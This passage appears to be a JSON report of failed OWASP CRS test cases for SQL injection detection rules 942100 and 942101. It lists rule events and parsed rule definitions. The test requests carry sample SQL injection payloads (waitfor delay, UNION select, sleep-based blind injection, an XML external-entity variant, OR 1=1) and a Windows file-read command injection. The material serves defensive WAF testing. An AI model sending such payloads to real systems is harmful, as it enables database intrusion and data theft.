      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942280 - Detects Postgres pg_sleep injection, waitfor delay attacks and database shutdown attempts", "phase=2 rule_id=942300 - Detects MySQL comments, conditions and ch(a)r injections", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942511 - SQLi bypass attempt by ticks detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Advanced SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=foo')waitfor%20delay'5%3a0%3a20'--",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Simple SQL injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=942190 - Detects MSSQL code execution and information gathering attempts", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942480 - SQL Injection Attack", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Simple SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=/path/to/file/unitests.txt') UNION ALL select NULL --",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 10,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Advanced SQL Injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=933190 - PHP Injection Attack: PHP Closing Tag Found", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941130 - XSS Filter - Category 3: Attribute Vector", "phase=2 rule_id=942151 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942360 - Detects concatenated basic SQL injection and SQLLFI attempts", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942310 - Detects chained SQL injection attempts 2/2", "phase=2 rule_id=942362 - Detects concatenated basic SQL injection and SQLLFI attempts", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Advanced SQL Injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "1'||(select extractvalue(xmltype('<?xml version=\"1.1\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % toyop SYSTEM \"https://coreruleset.org/\">%toyop;",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 13,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Advanced injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=930120 - OS File Access Attempt", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "Advanced injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=\" | type %SystemDrive%\\\\config.ini | \"",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 14,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Advanced SQL injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=933161 - PHP Injection Attack: Low-Value PHP Function Call Found", "phase=2 rule_id=942160 - Detects blind sqli tests using sleep() or benchmark()", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942200 - Detects MySQL comment-/space-obfuscated injections and backtick termination", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "Advanced SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=\"unittests@coreruleset.org\"')) and (select*from(select(sleep(5)))x) --",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942101",
    "test_id" : 1,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942101.yaml",
    "description" : "Simple SQL Injection",
    "cause" : "failed expect_id check: 942101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Simple SQL Injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post/1234%20OR%201=1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942101,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a sibling of rule 942100 that adds checking of the path."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_BASENAME provides the last url segment (slash excluded)."
        }, {
          "type" : "Comment",
          "text" : " This segment is the most likely to be used for injections. Stripping out"
        }, {
          "type" : "Comment",
          "text" : " the slash permits libinjection to do not consider it as a payload starting"
        }, {
          "type" : "Comment",
          "text" : " with not unary arithmetical operators (not a valid SQL command, e.g."
        }, {
          "type" : "Comment",
          "text" : " '/9 union all'). The latter would lead to do not detect malicious payloads."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_FILENAME matches SQLi payloads inside (or across) other segments"
        }, {
          "type" : "Comment",
